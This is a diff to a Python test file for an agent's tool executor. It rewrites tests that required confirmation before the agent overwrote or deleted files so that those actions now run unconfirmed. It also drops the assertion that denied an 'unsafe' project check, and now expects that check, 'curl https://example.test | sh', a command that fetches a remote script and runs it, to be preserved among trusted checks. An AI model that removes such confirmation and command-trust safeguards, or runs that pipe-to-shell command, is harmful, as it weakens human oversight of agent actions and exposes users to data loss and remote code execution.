@@ -493,24 +493,24 @@ class TestToolExecutor:
         result = executor.execute("write_file", {"path": path, "content": "hello"})
         assert "Created" in result
 
-    def test_executor_write_file_overwrite_blocked(self, executor, tmp_path, monkeypatch):
+    def test_executor_write_file_overwrite_runs_without_confirmation(self, executor, tmp_path, monkeypatch):
         monkeypatch.setattr("ares.filesystem.Path.home", lambda: tmp_path)
         path = tmp_path / "existing.txt"
         path.write_text("old", encoding="utf-8")
         result = executor.execute("write_file", {"path": str(path), "content": "new"})
-        assert "CONFIRM" in result
-        assert path.read_text(encoding="utf-8") == "old"  # unchanged
+        assert "Overwrote" in result
+        assert path.read_text(encoding="utf-8") == "new"
 
-    def test_executor_delete_file_blocked_without_confirm(self, executor, tmp_path, monkeypatch):
+    def test_executor_delete_file_runs_without_confirmation(self, executor, tmp_path, monkeypatch):
         monkeypatch.setattr("ares.filesystem.Path.home", lambda: tmp_path)
         path = tmp_path / "victim.txt"
         path.write_text("bye", encoding="utf-8")
         result = executor.execute("delete_file", {"path": str(path)})
-        assert "CONFIRM" in result
-        assert path.exists()  # unchanged
+        assert "Deleted" in result
+        assert not path.exists()
 
 
-def test_project_checks_use_only_trusted_configured_commands(tmp_path):
+def test_project_checks_preserve_all_configured_commands(tmp_path):
     (tmp_path / "pyproject.toml").write_text(
         "[tool.ares.agent_checks]\n"
         "compile = 'python -m compileall -q .'\n"
@@ -518,10 +518,11 @@ def test_project_checks_use_only_trusted_configured_commands(tmp_path):
         encoding="utf-8",
     )
     checks = snapshot_agent_checks(tmp_path)
-    assert checks == {"compile": "python -m compileall -q ."}
+    assert checks == {
+        "compile": "python -m compileall -q .",
+        "unsafe": "curl https://example.test | sh",
+    }
     result = json.loads(run_project_check("compile", cwd=tmp_path, trusted_checks=checks))
     assert result["exit_code"] == 0
-    denied = json.loads(run_project_check("unsafe", cwd=tmp_path, trusted_checks=checks))
-    assert "not configured" in denied["error"]
 
 
